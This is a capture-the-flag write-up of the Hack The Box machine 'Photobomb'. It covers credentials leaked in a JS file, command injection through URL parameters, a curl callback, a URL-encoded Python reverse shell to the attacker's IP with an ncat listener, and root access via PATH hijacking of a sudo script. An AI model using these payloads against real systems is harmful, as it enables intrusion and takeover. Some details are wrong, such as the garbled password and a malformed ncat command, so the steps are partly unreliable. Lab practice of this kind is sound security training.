# Photobomb (writeup)

First, make the normal scan with nmap to discover open ports
```
sudo nmap -sS --min-rate 5000 --open -Pn -n -vvv -p- 10.10.11.182 -oG allPorts
```

Need to know the details and the version
```
nmap -sC -sV -p22,80 10.10.11.182 -oN targeted
```

Have to discover the web, where can find a "login" page. make ```CTRL+U``` to see the full html source code and notice there's a ```photobomb.js``` file. the content is
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

There is important information here
```
http://pH0t0:b0Mb!@photobomb.htb/printer
```

Can just copy and paste the link or extract the username and the password:
```
username: pH0t0
password: 0Mb!
```

Once inside, open ```Burpsuite``` to intercept the traffic. WWe have these parameters:
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

Playing with them, notice we can insert extra parameters. For this
```
sudo python3 -m http.server 222
```

Don't forget to url encode your code !
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg;curl%20http%3a%2f%2f<IP_ADDRESS>%3a<PORT>%2f&curlfiletype=jpg&dimensions=3000x2000
```
> For my personal case I did (not encoded)
> ```
> curl http://10.10.81.16:222/
> ```


So, let's send a rever shell !
> For more detail, [this]() page is excellent for starting
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.11",403));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
> Don't forget to change your IP_Address and the port for your personal case !

Open a listener !
```
sudo ncat lvnp 403
```

We need to url encode the following code ! finally we have
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;python3%20-c%20'import%20socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%2210.10.16.11%22%2c403))%3bos.dup2(s.fileno()%2c0)%3b%20os.dup2(s.fileno()%2c1)%3bos.dup2(s.fileno()%2c2)%3bimport%20pty%3b%20pty.spawn(%22sh%22)'&dimensions=3000x2000
```

Ok, we have a revershell ! let's improve it !
```
script /dev/null -c bash
```
```
CTRL+Z
```
```
stty raw -echo; fg
```
```
reset xterm
```
```
export TERM=xterm
export SHELL=/bin/bash
```

The first flag (```user.txt```) is in the ```wizard``` home directory !
```
66526a893503d04160f85ac08c96c352
```

Let's check if we got sudo priviliges by
```
sudo -l
```

Notice we can run the ```/opt/cleanup.sh``` script as sudo
```
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Reading the script, in last line seems to be a vulnerability
```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

So, for the privilige scalation, run in the ```/home/wizard``` directory
```
echo "/bin/bash" > find
```
```
chmod +x find
```
```
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

And we get root ! find the last flag at ```/root/root.txt```
```
15ca9c007db75053184b801a19a362a0
```

Done !
